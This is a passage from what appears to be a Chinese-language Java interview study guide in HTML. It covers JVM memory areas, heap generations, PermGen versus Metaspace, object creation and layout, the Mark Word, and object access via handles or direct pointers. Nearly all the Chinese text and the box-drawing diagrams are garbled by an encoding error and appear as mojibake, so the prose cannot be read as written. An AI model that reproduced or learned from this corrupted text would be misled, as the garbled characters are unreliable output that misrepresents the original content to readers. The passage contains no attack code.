<li>å±€éƒ¨å˜é‡è¡¨</li>
<li>æ“ä½œæ•°æ ˆ</li>
<li>åŠ¨æ€é“¾æ¥</li>
<li>æ–¹æ³•è¿”å›åœ°å€</li>
</ul>
<p><strong>10. å±€éƒ¨å˜é‡è¡¨çš„ä½œç”¨ï¼Ÿ</strong></p>
<p>å­˜å‚¨æ–¹æ³•å‚æ•°å’Œå±€éƒ¨å˜é‡ï¼ŒåŒ…æ‹¬åŸºæœ¬æ•°æ®ç±»å‹å’Œå¯¹è±¡å¼•ç”¨ã€‚</p>
<p><strong>11. æ“ä½œæ•°æ ˆçš„ä½œç”¨ï¼Ÿ</strong></p>
<p>ç”¨äºè®¡ç®—å’Œä¸´æ—¶å­˜å‚¨ï¼ŒLIFOç»“æ„ã€‚</p>
<p><strong>12. æœ¬åœ°æ–¹æ³•æ ˆçš„ä½œç”¨ï¼Ÿ</strong></p>
<p>ä¸ºNativeæ–¹æ³•æœåŠ¡ï¼Œä¸è™šæ‹Ÿæœºæ ˆç±»ä¼¼ä½†æœåŠ¡äºæœ¬åœ°æ–¹æ³•ã€‚</p>
<p><strong>13. Javaå †çš„ä½œç”¨å’Œç»“æ„ï¼Ÿè¯·ç”»å‡ºå †çš„ç»“æ„å›¾</strong></p>
<p><strong>ä½œç”¨ï¼š</strong></p>
<ul>
<li>å­˜å‚¨å¯¹è±¡å®ä¾‹å’Œæ•°ç»„</li>
<li>æ‰€æœ‰çº¿ç¨‹å…±äº«</li>
<li>JVMç®¡ç†çš„æœ€å¤§ä¸€å—å†…å­˜åŒºåŸŸ</li>
</ul>
<p><strong>å †çš„ç»“æ„å›¾ï¼š</strong></p>
<pre><code class="hljs language-scss" lang="scss">Javaå †ç»“æ„ï¼š

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚    æ–°ç”Ÿä»£(<span class="hljs-number">1</span>/<span class="hljs-number">3</span>)   â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
â”‚  â”‚  <span class="hljs-built_in">Eden</span>(<span class="hljs-number">80%</span>)â”‚  â”‚ - æ–°å¯¹è±¡é¦–å…ˆåˆ†é…åœ¨è¿™é‡Œ
â”‚  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤  â”‚
â”‚  â”‚ <span class="hljs-built_in">S0</span>(<span class="hljs-number">10%</span>)S1 â”‚  â”‚ - Minor GCåå­˜æ´»å¯¹è±¡å¤åˆ¶åˆ°è¿™é‡Œ
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚   è€å¹´ä»£(<span class="hljs-number">2</span>/<span class="hljs-number">3</span>)    â”‚ - é•¿æœŸå­˜æ´»çš„å¯¹è±¡
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

æ¯”ä¾‹ï¼ˆé»˜è®¤ï¼‰ï¼š
æ–°ç”Ÿä»£ : è€å¹´ä»£ = <span class="hljs-number">1</span> : <span class="hljs-number">2</span>
Eden : Survivor0 : Survivor1 = <span class="hljs-number">8</span> : <span class="hljs-number">1</span> : <span class="hljs-number">1</span>
</code></pre>
<p><strong>å„éƒ¨åˆ†è¯´æ˜ï¼š</strong></p>
<ul>
<li><strong>EdenåŒº</strong>ï¼šæ–°å¯¹è±¡é¦–å…ˆåˆ†é…åœ¨è¿™é‡Œï¼Œçº¦å æ–°ç”Ÿä»£çš„80%</li>
<li><strong>SurvivoråŒº</strong>ï¼šåˆ†ä¸ºS0å’ŒS1ï¼Œç”¨äºMinor GCåå­˜æ´»å¯¹è±¡çš„æš‚å­˜ï¼Œå„çº¦å æ–°ç”Ÿä»£çš„10%</li>
<li><strong>è€å¹´ä»£</strong>ï¼šå­˜å‚¨é•¿æœŸå­˜æ´»çš„å¯¹è±¡ï¼Œçº¦å å †çš„2/3</li>
</ul>
<p><strong>14. æ–°ç”Ÿä»£å’Œè€å¹´ä»£çš„åŒºåˆ«ï¼Ÿ</strong></p>
<ul>
<li><strong>æ–°ç”Ÿä»£</strong>ï¼šå¯¹è±¡ç”Ÿå‘½å‘¨æœŸçŸ­ï¼ŒGCé¢‘ç¹ï¼Œå å †çš„1/3</li>
<li><strong>è€å¹´ä»£</strong>ï¼šå¯¹è±¡ç”Ÿå‘½å‘¨æœŸé•¿ï¼ŒGCé¢‘ç‡ä½ä½†è€—æ—¶é•¿ï¼Œå å †çš„2/3</li>
</ul>
<p><strong>15. ä¸ºä»€ä¹ˆè¦æœ‰SurvivoråŒºï¼Ÿ</strong></p>
<p>è®©å¯¹è±¡åœ¨æ–°ç”Ÿä»£å¤šå­˜æ´»å‡ æ¬¡ï¼Œåªæœ‰çœŸæ­£é•¿æœŸå­˜æ´»çš„å¯¹è±¡æ‰è¿›å…¥è€å¹´ä»£ï¼Œå‡å°‘Full GCçš„é¢‘ç‡ã€‚</p>
<p><strong>16. ä¸ºä»€ä¹ˆè¦æœ‰ä¸¤ä¸ªSurvivoråŒºï¼Ÿ</strong></p>
<p>å®ç°å¤åˆ¶ç®—æ³•ï¼Œä¿è¯æ–°ç”Ÿä»£å§‹ç»ˆæœ‰ä¸€ä¸ªSurvivoråŒºæ˜¯ç©ºçš„ï¼Œé¿å…å†…å­˜ç¢ç‰‡ã€‚</p>
<p><strong>17. æ–¹æ³•åŒºçš„ä½œç”¨ï¼Ÿ</strong></p>
<p>å­˜å‚¨ç±»ä¿¡æ¯ã€å¸¸é‡ã€é™æ€å˜é‡ã€JITç¼–è¯‘åçš„ä»£ç ã€‚</p>
<p><strong>18. æ°¸ä¹…ä»£å’Œå…ƒç©ºé—´çš„åŒºåˆ«ï¼Ÿ</strong></p>
<p>ä¸»è¦åŒºåˆ«ï¼š</p>








































<table><thead><tr><th>ç‰¹æ€§</th><th>æ°¸ä¹…ä»£ï¼ˆPermGenï¼‰</th><th>å…ƒç©ºé—´ï¼ˆMetaspaceï¼‰</th></tr></thead><tbody><tr><td><strong>å­˜å‚¨ä½ç½®</strong></td><td>å †å†…å­˜ä¸­</td><td>æœ¬åœ°å†…å­˜ï¼ˆNative Memoryï¼‰</td></tr><tr><td><strong>å¤§å°é™åˆ¶</strong></td><td>å›ºå®šå¤§å°ï¼Œéœ€è¦é¢„å…ˆè®¾ç½®</td><td>åŠ¨æ€è°ƒæ•´ï¼Œé»˜è®¤æ— é™åˆ¶</td></tr><tr><td><strong>å†…å­˜ç®¡ç†</strong></td><td>å—JVMå †å†…å­˜é™åˆ¶</td><td>ä¸å—JVMå †å†…å­˜é™åˆ¶</td></tr><tr><td><strong>GCå½±å“</strong></td><td>GCæ•ˆç‡è¾ƒä½</td><td>GCæ•ˆç‡è¾ƒé«˜</td></tr><tr><td><strong>æº¢å‡ºé—®é¢˜</strong></td><td>å®¹æ˜“æº¢å‡ºï¼ˆPermGen spaceï¼‰</td><td>ç›¸å¯¹ä¸å®¹æ˜“æº¢å‡ºï¼ˆMetaspaceï¼‰</td></tr><tr><td><strong>é€‚ç”¨ç‰ˆæœ¬</strong></td><td>JDK 8ä¹‹å‰</td><td>JDK 8åŠä¹‹å</td></tr></tbody></table>
<p><strong>ä¸ºä»€ä¹ˆæ”¹ç”¨å…ƒç©ºé—´ï¼Ÿ</strong></p>
<ul>
<li>æé«˜GCæ•ˆç‡ï¼šå…ƒç©ºé—´çš„GCæ•ˆç‡æ¯”æ°¸ä¹…ä»£é«˜</li>
<li>é¿å…æº¢å‡ºï¼šæ°¸ä¹…ä»£å›ºå®šå¤§å°å®¹æ˜“æº¢å‡ºï¼Œå…ƒç©ºé—´åŠ¨æ€è°ƒæ•´</li>
<li>æ›´å¥½çš„å†…å­˜ç®¡ç†ï¼šå…ƒç©ºé—´ä½¿ç”¨æœ¬åœ°å†…å­˜ï¼Œç®¡ç†æ›´çµæ´»</li>
</ul>
<p><strong>19. ä¸ºä»€ä¹ˆæ°¸ä¹…ä»£è¢«å…ƒç©ºé—´æ›¿ä»£ï¼Ÿ</strong></p>
<p>æé«˜GCæ•ˆç‡ã€é¿å…æº¢å‡ºã€æ›´å¥½çš„å†…å­˜ç®¡ç†ã€ä¸HotSpotåˆ†ç¦»ã€‚</p>
<p><strong>20. è¿è¡Œæ—¶å¸¸é‡æ± çš„ä½œç”¨ï¼Ÿ</strong></p>
<p>å­˜å‚¨ç¼–è¯‘æœŸç”Ÿæˆçš„å­—é¢é‡å’Œç¬¦å·å¼•ç”¨ã€‚</p>
<p><strong>21. ç›´æ¥å†…å­˜çš„ä½œç”¨ï¼Ÿ</strong></p>
<p>NIOä½¿ç”¨ï¼Œå †å¤–å†…å­˜ï¼Œæé«˜I/Oæ€§èƒ½ã€‚</p>
<h4 data-id="heading-88">14.2 æ·±å…¥ç†è§£é¢˜</h4>
<p><strong>1. å¯¹è±¡åˆ›å»ºçš„è¿‡ç¨‹ï¼Ÿè¯·ç”»å‡ºæµç¨‹å›¾</strong></p>
<p>å¯¹è±¡åˆ›å»ºçš„å®Œæ•´æµç¨‹ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown">å¯¹è±¡åˆ›å»ºæµç¨‹ï¼š

<span class="hljs-bullet">1.</span> ç±»åŠ è½½æ£€æŸ¥
<span class="hljs-bullet">   -</span> æ£€æŸ¥ç±»æ˜¯å¦å·²åŠ è½½
<span class="hljs-bullet">   -</span> å¦‚æœæ²¡æœ‰ï¼Œæ‰§è¡Œç±»åŠ è½½è¿‡ç¨‹
   â†“
<span class="hljs-bullet">2.</span> åˆ†é…å†…å­˜
<span class="hljs-bullet">   -</span> æŒ‡é’ˆç¢°æ’ï¼ˆå †å†…å­˜è§„æ•´ï¼‰
<span class="hljs-bullet">   -</span> ç©ºé—²åˆ—è¡¨ï¼ˆå †å†…å­˜ä¸è§„æ•´ï¼‰
<span class="hljs-bullet">   -</span> TLABï¼ˆæ¯ä¸ªçº¿ç¨‹ç‹¬ç«‹çš„åˆ†é…åŒºåŸŸï¼‰
   â†“
<span class="hljs-bullet">3.</span> åˆå§‹åŒ–é›¶å€¼
<span class="hljs-bullet">   -</span> å°†å†…å­˜ç©ºé—´åˆå§‹åŒ–ä¸ºé›¶å€¼
<span class="hljs-bullet">   -</span> åŸºæœ¬ç±»å‹ï¼š0ã€falseã€0.0
<span class="hljs-bullet">   -</span> å¼•ç”¨ç±»å‹ï¼šnull
   â†“
<span class="hljs-bullet">4.</span> è®¾ç½®å¯¹è±¡å¤´
<span class="hljs-bullet">   -</span> Mark Wordï¼ˆhashCodeã€GCå¹´é¾„ã€é”çŠ¶æ€ç­‰ï¼‰
<span class="hljs-bullet">   -</span> ç±»å‹æŒ‡é’ˆï¼ˆæŒ‡å‘ç±»å…ƒæ•°æ®ï¼‰
<span class="hljs-bullet">   -</span> æ•°ç»„é•¿åº¦ï¼ˆå¦‚æœæ˜¯æ•°ç»„ï¼‰
   â†“
<span class="hljs-bullet">5.</span> æ‰§è¡Œæ„é€ å‡½æ•°
<span class="hljs-bullet">   -</span> æ‰§è¡Œæ„é€ å‡½æ•°ä¸­çš„ä»£ç 
<span class="hljs-bullet">   -</span> æŒ‰ç…§ç¨‹åºå‘˜çš„æ„æ„¿åˆå§‹åŒ–å¯¹è±¡
</code></pre>
<p><strong>è¯¦ç»†è¯´æ˜ï¼š</strong></p>
<ol>
<li><strong>ç±»åŠ è½½æ£€æŸ¥</strong>ï¼šé‡åˆ°newæŒ‡ä»¤æ—¶ï¼Œæ£€æŸ¥ç±»æ˜¯å¦å·²åŠ è½½</li>
<li><strong>åˆ†é…å†…å­˜</strong>ï¼šåœ¨å †ä¸­åˆ†é…å†…å­˜ç©ºé—´ï¼ˆä¼˜å…ˆåœ¨EdenåŒºï¼‰</li>
<li><strong>åˆå§‹åŒ–é›¶å€¼</strong>ï¼šå°†åˆ†é…çš„å†…å­˜åˆå§‹åŒ–ä¸ºé›¶å€¼ï¼Œä¿è¯å­—æ®µå¯ä»¥ä¸èµ‹å€¼å°±ä½¿ç”¨</li>
<li><strong>è®¾ç½®å¯¹è±¡å¤´</strong>ï¼šè®¾ç½®Mark Wordå’Œç±»å‹æŒ‡é’ˆç­‰å…ƒæ•°æ®</li>
<li><strong>æ‰§è¡Œæ„é€ å‡½æ•°</strong>ï¼šæŒ‰ç…§ç¨‹åºå‘˜çš„æ„æ„¿åˆå§‹åŒ–å¯¹è±¡</li>
</ol>
<p><strong>2. å¯¹è±¡çš„å†…å­˜å¸ƒå±€ï¼Ÿè¯·ç”»å‡ºå¸ƒå±€å›¾</strong></p>
<p>å¯¹è±¡åœ¨å†…å­˜ä¸­çš„å¸ƒå±€ï¼š</p>
<pre><code class="hljs language-scss" lang="scss">å¯¹è±¡å†…å­˜å¸ƒå±€ï¼š

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  å¯¹è±¡å¤´      â”‚ 
â”‚  - <span class="hljs-selector-tag">Mark</span> Wordâ”‚ (hashCodeã€GCå¹´é¾„ã€é”çŠ¶æ€)
â”‚  - ç±»å‹æŒ‡é’ˆ  â”‚ (æŒ‡å‘ç±»å…ƒæ•°æ®)
â”‚  - æ•°ç»„é•¿åº¦  â”‚ (ä»…æ•°ç»„å¯¹è±¡æœ‰)
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  å®ä¾‹æ•°æ®    â”‚ (å­—æ®µçš„å®é™…å€¼)
â”‚  - çˆ¶ç±»å­—æ®µ  â”‚
â”‚  - å­ç±»å­—æ®µ  â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  å¯¹é½å¡«å……    â”‚ (ä¿è¯<span class="hljs-number">8</span>å­—èŠ‚å¯¹é½)
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

å¯¹è±¡å¤§å° = å¯¹è±¡å¤´ + å®ä¾‹æ•°æ® + å¯¹é½å¡«å……
</code></pre>
<p><strong>å„éƒ¨åˆ†è¯´æ˜ï¼š</strong></p>
<ol>
<li>
<p><strong>å¯¹è±¡å¤´ï¼ˆHeaderï¼‰</strong></p>
<ul>
<li>Mark Wordï¼šå­˜å‚¨å¯¹è±¡çš„hashCodeã€GCå¹´é¾„ã€é”çŠ¶æ€ç­‰</li>
<li>ç±»å‹æŒ‡é’ˆï¼šæŒ‡å‘å¯¹è±¡æ‰€å±çš„ç±»å…ƒæ•°æ®</li>
<li>æ•°ç»„é•¿åº¦ï¼šä»…æ•°ç»„å¯¹è±¡æœ‰</li>
</ul>
</li>
<li>
<p><strong>å®ä¾‹æ•°æ®ï¼ˆInstance Dataï¼‰</strong></p>
<ul>
<li>å­˜å‚¨å¯¹è±¡çš„å®é™…å­—æ®µå€¼</li>
<li>çˆ¶ç±»å­—æ®µåœ¨å‰ï¼Œå­ç±»å­—æ®µåœ¨å</li>
<li>ç›¸åŒå®½åº¦çš„å­—æ®µåˆ†é…åœ¨ä¸€èµ·</li>
</ul>
</li>
<li>
<p><strong>å¯¹é½å¡«å……ï¼ˆPaddingï¼‰</strong></p>
<ul>
<li>ä¿è¯å¯¹è±¡å¤§å°æ˜¯8å­—èŠ‚çš„å€æ•°</li>
<li>æé«˜å†…å­˜è®¿é—®æ•ˆç‡</li>
</ul>
</li>
</ol>
<p><strong>3. å¯¹è±¡å¤´åŒ…å«å“ªäº›ä¿¡æ¯ï¼Ÿ</strong></p>
<ul>
<li>Mark Wordï¼šhashCodeã€GCå¹´é¾„ã€é”çŠ¶æ€ç­‰</li>
<li>ç±»å‹æŒ‡é’ˆï¼šæŒ‡å‘ç±»å…ƒæ•°æ®</li>
<li>æ•°ç»„é•¿åº¦ï¼šä»…æ•°ç»„å¯¹è±¡æœ‰</li>
</ul>
<p><strong>4. Mark Wordçš„ä½œç”¨å’Œç»“æ„ï¼Ÿ</strong></p>
<p><strong>Mark Wordçš„ä½œç”¨ï¼š</strong></p>
<p>Mark Wordæ˜¯å¯¹è±¡å¤´çš„ä¸€éƒ¨åˆ†ï¼Œç”¨äºå­˜å‚¨å¯¹è±¡çš„è¿è¡Œæ—¶æ•°æ®ã€‚</p>
<p><strong>å­˜å‚¨å†…å®¹ï¼š</strong></p>
<ul>
<li><strong>hashCode</strong>ï¼šå¯¹è±¡çš„å“ˆå¸Œç </li>
<li><strong>GCå¹´é¾„</strong>ï¼šå¯¹è±¡ç»å†çš„GCæ¬¡æ•°ï¼ˆ4ä½ï¼Œæœ€å¤§15ï¼‰</li>
<li><strong>é”çŠ¶æ€</strong>ï¼šåå‘é”ã€è½»é‡çº§é”ã€é‡é‡çº§é”ç­‰</li>
<li><strong>åå‘çº¿ç¨‹ID</strong>ï¼šåå‘é”çš„çº¿ç¨‹ID</li>
<li><strong>åå‘æ—¶é—´æˆ³</strong>ï¼šåå‘é”çš„æ—¶é—´æˆ³</li>
</ul>
<p><strong>Mark Wordçš„ç»“æ„ï¼ˆ64ä½JVMï¼‰ï¼š</strong></p>





























<table><thead><tr><th>é”çŠ¶æ€</th><th>Mark Wordï¼ˆ64ä½ï¼‰</th></tr></thead><tbody><tr><td><strong>æ— é”</strong></td><td>hashCode(31ä½) + GCå¹´é¾„(4ä½) + ...</td></tr><tr><td><strong>åå‘é”</strong></td><td>çº¿ç¨‹ID(54ä½) + Epoch(2ä½) + ...</td></tr><tr><td><strong>è½»é‡çº§é”</strong></td><td>æŒ‡å‘æ ˆä¸­é”è®°å½•çš„æŒ‡é’ˆ(62ä½) + ...</td></tr><tr><td><strong>é‡é‡çº§é”</strong></td><td>æŒ‡å‘monitorçš„æŒ‡é’ˆ(62ä½) + ...</td></tr><tr><td><strong>GCæ ‡è®°</strong></td><td>ç©ºï¼ˆä¸éœ€è¦è®°å½•ä¿¡æ¯ï¼‰</td></tr></tbody></table>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>Mark Wordåœ¨ä¸åŒé”çŠ¶æ€ä¸‹å­˜å‚¨ä¸åŒçš„ä¿¡æ¯</li>
<li>32ä½JVMï¼š32ä½ï¼Œ64ä½JVMï¼š64ä½</li>
<li>è¿™æ˜¯synchronizedé”å‡çº§çš„åŸºç¡€</li>
</ul>
<p><strong>5. ç±»å‹æŒ‡é’ˆçš„ä½œç”¨ï¼Ÿ</strong></p>
<p>æŒ‡å‘å¯¹è±¡æ‰€å±çš„ç±»å…ƒæ•°æ®ï¼Œç”¨äºç¡®å®šå¯¹è±¡ç±»å‹ã€æ”¯æŒinstanceofç­‰ã€‚</p>
<p><strong>6. å¯¹è±¡çš„è®¿é—®å®šä½æ–¹å¼æœ‰å“ªäº›ï¼Ÿè¯·ç”»å‡ºä¸¤ç§æ–¹å¼çš„å¯¹æ¯”å›¾</strong></p>
<p>å¯¹è±¡çš„è®¿é—®å®šä½æœ‰ä¸¤ç§æ–¹å¼ï¼š</p>
<p><strong>æ–¹å¼1ï¼šå¥æŸ„è®¿é—®</strong></p>
<pre><code class="hljs language-markdown" lang="markdown">å¥æŸ„è®¿é—®ï¼š

æ ˆå¼•ç”¨ â†’ å¥æŸ„æ±  â†’ å¯¹è±¡å®ä¾‹æ•°æ®
<span class="hljs-code">              â†’ ç±»å‹æ•°æ®
</span>
è®¿é—®è¿‡ç¨‹ï¼šéœ€è¦ä¸¤æ¬¡è®¿é—®ï¼ˆå…ˆè®¿é—®å¥æŸ„ï¼Œå†è®¿é—®å¯¹è±¡ï¼‰
</code></pre>
<p><strong>æ–¹å¼2ï¼šç›´æ¥æŒ‡é’ˆè®¿é—®ï¼ˆHotSpotä½¿ç”¨ï¼‰</strong></p>
<pre><code class="hljs">ç›´æ¥æŒ‡é’ˆè®¿é—®ï¼ˆHotSpotï¼‰ï¼š

æ ˆå¼•ç”¨ â†’ å¯¹è±¡å®ä¾‹æ•°æ® â†’ ç±»å‹æ•°æ®ï¼ˆé€šè¿‡å¯¹è±¡å¤´ä¸­ç±»å‹æŒ‡é’ˆï¼‰

è®¿é—®è¿‡ç¨‹ï¼šåªéœ€ä¸€æ¬¡è®¿é—®ï¼ˆç›´æ¥è®¿é—®å¯¹è±¡ï¼‰
</code></pre>
<p><strong>ä¸¤ç§æ–¹å¼çš„å¯¹æ¯”ï¼š</strong></p>



































<table><thead><tr><th>ç‰¹æ€§</th><th>å¥æŸ„è®¿é—®</th><th>ç›´æ¥æŒ‡é’ˆè®¿é—®</th></tr></thead><tbody><tr><td><strong>è®¿é—®æ¬¡æ•°</strong></td><td>ä¸¤æ¬¡ï¼ˆå…ˆè®¿é—®å¥æŸ„ï¼Œå†è®¿é—®å¯¹è±¡ï¼‰</td><td>ä¸€æ¬¡ï¼ˆç›´æ¥è®¿é—®å¯¹è±¡ï¼‰</td></tr><tr><td><strong>è®¿é—®é€Ÿåº¦</strong></td><td>è¾ƒæ…¢</td><td>è¾ƒå¿«</td></tr><tr><td><strong>å¼•ç”¨ç¨³å®šæ€§</strong></td><td>å¼•ç”¨ä¸å˜ï¼Œå¯¹è±¡ç§»åŠ¨åªéœ€æ›´æ–°å¥æŸ„</td><td>å¼•ç”¨ç›´æ¥æŒ‡å‘å¯¹è±¡</td></tr><tr><td><strong>GCå¼€é”€</strong></td><td>è¾ƒå°ï¼ˆåªéœ€ç§»åŠ¨å¯¹è±¡ï¼Œæ›´æ–°å¥æŸ„ï¼‰</td><td>è¾ƒå¤§ï¼ˆéœ€è¦æ›´æ–°æ‰€æœ‰å¼•ç”¨ï¼‰</td></tr><tr><td><strong>å†…å­˜å ç”¨</strong></td><td>è¾ƒå¤§ï¼ˆéœ€è¦é¢å¤–çš„å¥æŸ„æ± ï¼‰</td><td>è¾ƒå°ï¼ˆä¸éœ€è¦å¥æŸ„æ± ï¼‰</td></tr></tbody></table>
<p><strong>HotSpotä¸ºä»€ä¹ˆä½¿ç”¨ç›´æ¥æŒ‡é’ˆè®¿é—®ï¼Ÿ</strong></p>
<ul>
<li>æ€§èƒ½ä¼˜å…ˆï¼šè®¿é—®é€Ÿåº¦å¿«ï¼Œå‡å°‘é—´æ¥è®¿é—®å¼€é”€</li>
<li>å¯¹è±¡ç§»åŠ¨è¾ƒå°‘ï¼šç°ä»£GCç®—æ³•å¯ä»¥æ›´å¥½åœ°å¤„ç†å¯¹è±¡ç§»åŠ¨</li>
</ul>
<p><strong>7. å¥æŸ„è®¿é—®å’Œç›´æ¥æŒ‡é’ˆè®¿é—®çš„åŒºåˆ«ï¼Ÿ</strong></p>
<p>ä¸»è¦åŒºåˆ«ï¼š</p>








































<table><thead><tr><th>ç‰¹æ€§</th><th>å¥æŸ„è®¿é—®</th><th>ç›´æ¥æŒ‡é’ˆè®¿é—®ï¼ˆHotSpotï¼‰</th></tr></thead><tbody><tr><td><strong>è®¿é—®æ¬¡æ•°</strong></td><td>ä¸¤æ¬¡ï¼ˆå…ˆè®¿é—®å¥æŸ„ï¼Œå†è®¿é—®å¯¹è±¡ï¼‰</td><td>ä¸€æ¬¡ï¼ˆç›´æ¥è®¿é—®å¯¹è±¡ï¼‰</td></tr><tr><td><strong>è®¿é—®é€Ÿåº¦</strong></td><td>è¾ƒæ…¢</td><td>è¾ƒå¿«</td></tr><tr><td><strong>å¼•ç”¨ç¨³å®šæ€§</strong></td><td>å¼•ç”¨ä¸å˜ï¼Œå¯¹è±¡ç§»åŠ¨åªéœ€æ›´æ–°å¥æŸ„</td><td>å¼•ç”¨ç›´æ¥æŒ‡å‘å¯¹è±¡</td></tr><tr><td><strong>GCå¼€é”€</strong></td><td>è¾ƒå°ï¼ˆåªéœ€ç§»åŠ¨å¯¹è±¡ï¼Œæ›´æ–°å¥æŸ„ï¼‰</td><td>è¾ƒå¤§ï¼ˆéœ€è¦æ›´æ–°æ‰€æœ‰å¼•ç”¨ï¼‰</td></tr><tr><td><strong>å†…å­˜å ç”¨</strong></td><td>è¾ƒå¤§ï¼ˆéœ€è¦é¢å¤–çš„å¥æŸ„æ± ï¼‰</td><td>è¾ƒå°ï¼ˆä¸éœ€è¦å¥æŸ„æ± ï¼‰</td></tr><tr><td><strong>å®ç°å¤æ‚åº¦</strong></td><td>è¾ƒé«˜ï¼ˆéœ€è¦ç»´æŠ¤å¥æŸ„æ± ï¼‰</td><td>è¾ƒä½</td></tr></tbody></table>
<p><strong>HotSpotä½¿ç”¨ç›´æ¥æŒ‡é’ˆè®¿é—®çš„åŸå› ï¼š</strong></p>
<ul>
<li>è®¿é—®é€Ÿåº¦å¿«ï¼Œåªéœ€ä¸€æ¬¡å†…å­˜è®¿é—®</li>
<li>å¯¹è±¡ç§»åŠ¨é¢‘ç‡ä½ï¼Œç°ä»£GCç®—æ³•ä¼˜åŒ–äº†å¯¹è±¡ç§»åŠ¨</li>
<li>å®ç°ç®€å•ï¼Œä¸éœ€è¦ç»´æŠ¤å¥æŸ„æ± </li>
</ul>
<p><strong>8. HotSpotä¸ºä»€ä¹ˆä½¿ç”¨ç›´æ¥æŒ‡é’ˆè®¿é—®ï¼Ÿ</strong></p>
<p>æ€§èƒ½ä¼˜å…ˆï¼Œè®¿é—®é€Ÿåº¦å¿«ï¼Œå‡å°‘é—´æ¥è®¿é—®å¼€é”€ã€‚</p>
<p><strong>9. TLABæ˜¯ä»€ä¹ˆï¼Ÿæœ‰ä»€ä¹ˆä½œç”¨ï¼Ÿ</strong></p>
<p>Thread Local Allocation Bufferï¼Œæ¯ä¸ªçº¿ç¨‹åœ¨EdenåŒºæœ‰ç‹¬ç«‹çš„åˆ†é…åŒºåŸŸï¼Œé¿å…å¤šçº¿ç¨‹åˆ†é…å†…å­˜æ—¶çš„ç«äº‰ï¼Œæé«˜åˆ†é…æ•ˆç‡ã€‚</p>
<p><strong>10. æŒ‡é’ˆç¢°æ’å’Œç©ºé—²åˆ—è¡¨çš„åŒºåˆ«ï¼Ÿ</strong></p>
<ul>
<li><strong>æŒ‡é’ˆç¢°æ’</strong>ï¼šé€‚ç”¨äºå †å†…å­˜è§„æ•´ï¼Œç§»åŠ¨æŒ‡é’ˆåˆ†é…è¿ç»­å†…å­˜</li>
<li><strong>ç©ºé—²åˆ—è¡¨</strong>ï¼šé€‚ç”¨äºå †å†…å­˜ä¸è§„æ•´ï¼Œä»ç©ºé—²åˆ—è¡¨åˆ†é…</li>
</ul>
<p><strong>11. å¯¹è±¡å¤§å°å¦‚ä½•è®¡ç®—ï¼Ÿ</strong></p>
<p>å¯¹è±¡å¤´å¤§å° + å®ä¾‹æ•°æ®å¤§å° + å¯¹é½å¡«å……</p>
<p><strong>12. å¯¹é½å¡«å……çš„ä½œç”¨ï¼Ÿ</strong></p>
<p>ä¿è¯å¯¹è±¡å¤§å°æ˜¯8å­—èŠ‚çš„å€æ•°ï¼Œæé«˜å†…å­˜è®¿é—®æ•ˆç‡ã€‚</p>
<h3 data-id="heading-89">15. ç»¼åˆé¢è¯•é¢˜</h3>
<h4 data-id="heading-90">15.1 ç»¼åˆç†è§£é¢˜</h4>
<p><strong>1. JMMä¸»å†…å­˜ä¸JVMå †çš„å…³ç³»ï¼Ÿ</strong></p>
<p>JMMä¸­çš„"ä¸»å†…å­˜"ä¸»è¦å¯¹åº”JVMå†…å­˜åŒºåŸŸä¸­çš„"å †"ã€‚å…±äº«å˜é‡å­˜å‚¨åœ¨å †ä¸­ï¼Œå †æ˜¯çº¿ç¨‹å…±äº«çš„ã€‚</p>
<p><strong>2. JMMå·¥ä½œå†…å­˜ä¸JVMè™šæ‹Ÿæœºæ ˆçš„å…³ç³»ï¼Ÿ</strong></p>
<p>JMMä¸­çš„"å·¥ä½œå†…å­˜"ä¸»è¦å¯¹åº”JVMå†…å­˜åŒºåŸŸä¸­çš„"è™šæ‹Ÿæœºæ ˆå±€éƒ¨å˜é‡è¡¨"ã€‚å˜é‡å‰¯æœ¬å­˜å‚¨åœ¨å±€éƒ¨å˜é‡è¡¨ä¸­ã€‚</p>
<p><strong>3. å¯¹è±¡åœ¨å †ä¸­æ˜¯å¦‚ä½•å­˜å‚¨çš„ï¼Ÿè¯·ç”»å‡ºå­˜å‚¨ç»“æ„</strong></p>
<p>å¯¹è±¡åœ¨å †ä¸­çš„å­˜å‚¨ç»“æ„ï¼š</p>
<pre><code class="hljs language-scss" lang="scss">å¯¹è±¡åœ¨å †ä¸­çš„å¸ƒå±€ï¼š

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  å¯¹è±¡å¤´      â”‚ 
â”‚  - <span class="hljs-selector-tag">Mark</span> Wordâ”‚ (<span class="hljs-number">64</span>ä½æˆ–<span class="hljs-number">32</span>ä½)
â”‚  - ç±»å‹æŒ‡é’ˆ  â”‚ (<span class="hljs-number">32</span>ä½æˆ–<span class="hljs-number">64</span>ä½ï¼Œå¯èƒ½å‹ç¼©)
â”‚  - æ•°ç»„é•¿åº¦  â”‚ (ä»…æ•°ç»„ï¼Œ<span class="hljs-number">32</span>ä½)
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  å®ä¾‹æ•°æ®    â”‚ 
â”‚  - å­—æ®µå€¼    â”‚ (æŒ‰é¡ºåºå­˜å‚¨)
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  å¯¹é½å¡«å……    â”‚ (ä¿è¯<span class="hljs-number">8</span>å­—èŠ‚å¯¹é½)
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
